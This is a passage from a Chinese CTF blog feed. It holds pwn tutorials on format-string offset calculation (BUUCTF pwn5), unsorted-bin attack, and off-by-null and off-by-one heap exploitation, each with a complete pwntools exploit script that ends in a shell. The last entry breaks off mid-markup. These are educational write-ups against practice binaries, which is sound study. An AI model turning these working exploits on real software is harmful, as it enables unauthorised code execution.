        <content type="html"><![CDATA[<h2 id="pwntools自带的偏移函数算法"><a href="#pwntools自带的偏移函数算法" class="headerlink" title="pwntools自带的偏移函数算法"></a>pwntools自带的偏移函数算法</h2><hr><ul><li>这里以buuctf上的第五空间pwn5作为演示给出一个新的计算方法，可以说是十分便捷，但也不是万能的，应该可以应付大部分题目！</li></ul><hr><h3 id="第五空间：pwn5"><a href="#第五空间：pwn5" class="headerlink" title="第五空间：pwn5"></a>第五空间：pwn5</h3><p><img src="/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%81%8F%E7%A7%BB%E7%9A%84%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/1.png"><br>这里的漏洞十分明显，就是格式化字符串漏洞，它首先会打开一个靶机上的一个随机变化的文件，从中读取4个字节到程序，后来要输入一样的数才能绕过判断，因此这里思路就是控制输入的地址数据为我们自己的，就可以绕过if判断，获得shell。这里给出一个pwntools自带的函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token punctuation">:</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>      <span class="token comment">#这里的文件名为程序文件，自己更改</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>      <span class="token comment">#这个pad不用管它输入了什么</span><span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>fmt <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span>exec_fmt<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"offset ===> "</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以直接获得偏移量。<br>直接上exp：下面这个fmtstr_payload也是pwntools自带的函数，具体看我的这篇<a href="https://airunfive.github.io/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/">博客文章</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26184</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token punctuation">:</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>fmt <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span>exec_fmt<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"offset ===> "</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span>offset<span class="token punctuation">)</span>payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span>fmt<span class="token punctuation">.</span>offset<span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">0x804C044</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your name:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your passwd:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后获得的界面是这样的：<br><img src="/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%81%8F%E7%A7%BB%E7%9A%84%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unsortbin-attach</title>
      <link href="/2023/03/12/unsortbin-attach/"/>
      <url>/2023/03/12/unsortbin-attach/</url>
      
        <content type="html"><![CDATA[<h2 id="unsortbin-attach攻击原理"><a href="#unsortbin-attach攻击原理" class="headerlink" title="unsortbin-attach攻击原理"></a>unsortbin-attach攻击原理</h2><hr><p>这篇博客当初不想写的，当初不太理解，但后面好像挺常用到的还是记录一下。同时这也是时隔一个月的博客更新，恢复下进度，同时庆祝熬过了艰难的考试周。</p><hr><p>这里再次看看unsortbin的结构：<br><img src="/images/unsortbin-attach/1.png"><br>堆漏洞利用中第二常用的攻击手法。最简单的攻击手法，<strong>前提条件是UAF</strong>。任意内存地址写一个<strong>不确定</strong>的非常大的数（libc地址）。通常，我们利用unsortedbin attack来修改一些类似于<strong>修改次数限制、上限信息、伪造堆头、配合局部写</strong>等等，十分好用。</p><hr><p>unsortbin的链入链出的顺序和其他bin不一样，它是先进先出的，<strong>从头插入，从尾取出</strong>：<br><img src="/images/unsortbin-attach/2.jpg"></p><hr><p>我们要修改unsortedbin中的BK字段为target addr - 0x10（不是0x18，因为指向的是size段，这张图没画出来），当取出victim时会发生一下步骤：<br><img src="/images/unsortbin-attach/4.png"><br>fake chunk的fd、bk指针会指向unsortbin_chunks(av)的地址，这里就泄露了libc的某处地址<br>如下图是变化的全过程：<br><img src="/images/unsortbin-attach/3.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞offbynull</title>
      <link href="/2023/01/31/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/"/>
      <url>/2023/01/31/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/</url>
      
        <content type="html"><![CDATA[<h1 id="堆漏洞offbynull"><a href="#堆漏洞offbynull" class="headerlink" title="堆漏洞offbynull"></a>堆漏洞offbynull</h1><hr><ul><li>offbynull是offbyone的特殊情形，溢出的字节不能被我们所控制，只能溢出一个\x00，但是依然是可以利用的。现实中更为常见，因为字符串截断会在末尾加个空字符，如果边界检查不严格，就会出现offbynull。offbynull比起常规的offbyone利用方式稍微复杂一些，但是归究其本质，都是构造一个UAF供我们使用。<br>由于溢出字节只能是\x00，所以思路通常是改变其prev inuse位，通过合并构造overlap，然后构造UAF。</li></ul><hr><h2 id="0x01-offbynull原理讲解"><a href="#0x01-offbynull原理讲解" class="headerlink" title="0x01 offbynull原理讲解"></a>0x01 offbynull原理讲解</h2><hr><p>假设此时有四个0x100的堆块A、B、C、D：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/1.png"><br>我们在B中输入 ‘A’*0x90 + p64(0x200) + ‘\x00’，此时的内存布局如下：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/2.png"><br>可以看到c的previnuse位被改成了0，也就是说，程序会将B看作已经被释放的堆块，但实际它并没有被释放。在这里，我们将其改成了0x200,也就是说定位到了A堆块。但是A堆块明明没有被free，这时候我们如果free C会出现异常。我们需要做的就是骗系统，绕过检查，其实我们需要做的仅仅就是先将A free掉<br>放入unsortedbin，这时候再free C，就会触发合并操作。触发合并操作后，ABC会被看作一个大小为0x300的堆块放入unsortedbin中。然而实际上，B并没有被free，我们也就通过这样的方式构造了overlap。然后后续的操作也就和offbyone一样，通过overlap构造uaf，进而完成利用。<br><strong>在实际运用时，不局限都是0x100的，可以是中间的某个堆块是fast chunk也行，但是第一个在头的必须得是unsorted chunk大小的堆块，否则无法触发合并。</strong></p><h2 id="0x02-offbynull例题解析"><a href="#0x02-offbynull例题解析" class="headerlink" title="0x02 offbynull例题解析"></a>0x02 offbynull例题解析</h2><hr><p>环境：本地 Ubuntu16.04<br>例题：<a href="/download/offbynull">offbynull</a></p><hr><p>这里要特别说明，这题有点奇怪，如果用3个堆块进行构造overlap就会在free报错（不晓得为什么），但是用四个堆块就没问题，并且相对于前面的博客来看这里unsortbin释放后的fd指针指向的位置不是main_arena+88也很奇怪，可能是例题问题吧，可以自己调试看看。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./offbynull'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'4:delete'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> <span class="token comment">#用于泄露libc地址</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>  add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#4往上合并到1</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#防止和topchunk合并</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b00</span> <span class="token comment">#unsortbin fd指针改变位置了，可以调试一下，libc基地址一般都是以000结尾</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>realloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>fake_chunk<span class="token operator">=</span>malloc<span class="token operator">-</span><span class="token number">0x23</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4527a</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x270</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#重新申请过3，因为漏洞出现在add，如果在上面就这样申请，会发现不会成功get shell</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#先释放1，否则报错</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">#1~4放入unsortbin</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#将chunk 2放入fastbin</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x160</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#申请的堆块从unsortbin切割0x160，正好切割到chunk 2</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token string">'0x10'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/3.png"><br>结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞offbyone</title>
      <link href="/2023/01/30/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/"/>
      <url>/2023/01/30/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/</url>
      
        <content type="html"><![CDATA[<h1 id="堆漏洞offbyone"><a href="#堆漏洞offbyone" class="headerlink" title="堆漏洞offbyone"></a>堆漏洞offbyone</h1><hr><ul><li>offbyeone：一个简单又比较实用的漏洞，是在堆溢出只能溢出一个字节的时候使用。</li></ul><hr><h2 id="0x01-offbyone原理分析"><a href="#0x01-offbyone原理分析" class="headerlink" title="0x01 offbyone原理分析"></a>0x01 offbyone原理分析</h2><p><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/1.png"><br>假如题目存在offbyone漏洞，堆中有ABCD四个已经被分配的大小为0x70的chunk，现在都是使用状态。然后A是我们进行offbyone的chunk，我们目的是将B的size改掉。我们在chunk A中输入我们输入**’A’*0x68 + ‘\xe1’**将左图改为右图，可以看到B的size被改大了，正好覆盖到了C的末尾。<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/2.png"><br>这时候我们将Cfree掉，他会进入fastbin。我们再将B free掉，B+C这一段区域会进入unsorted bin。我们再次申请一个大小为0xd0的堆块，也就是说B+C这段内存又被我们控制了，此时我们就可以控制C的fd字段，就可以进行fastbinattack了。</p><hr><h2 id="0x02-offbyone例题讲解"><a href="#0x02-offbyone例题讲解" class="headerlink" title="0x02 offbyone例题讲解"></a>0x02 offbyone例题讲解</h2><hr><p>环境：本地 Ubuntu16.04<br>例题：<a href="/download/offbyone">offbyone</a></p><hr><h3 id="（1）原理补充："><a href="#（1）原理补充：" class="headerlink" title="（1）原理补充："></a>（1）原理补充：</h3><hr><p>这里用到了realloc的打法，是在给的4个onegadget都失效的情况下使用具体看这篇<a href="www.cnblogs.com/hetianlab/p/13884739.html">文章</a></p><h3 id="（2）漏洞点："><a href="#（2）漏洞点：" class="headerlink" title="（2）漏洞点："></a>（2）漏洞点：</h3><p><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/3.png"><br>这里因为strlen函数读到0才会停止，而程序是以小端序存放<strong>（高字节在右边，低字节在左边）</strong>所以会多读一个“size”（1个字节）</p><h3 id="（3）exp"><a href="#（3）exp" class="headerlink" title="（3）exp"></a>（3）exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./offbyone'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'4:delete'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment">#这里填充0x68个a覆盖0，等下才能读入0x68个字节</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>realloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>fake_chunk<span class="token operator">=</span>malloc<span class="token operator">-</span><span class="token number">0x23</span>one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4527a</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span><span class="token string">'\xe1'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>   <span class="token comment">#realloc在malloc的前面</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0xb看下面补充算法</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token comment">#onegadget覆盖realloc，realloc覆盖malloc</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token string">'0x10'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 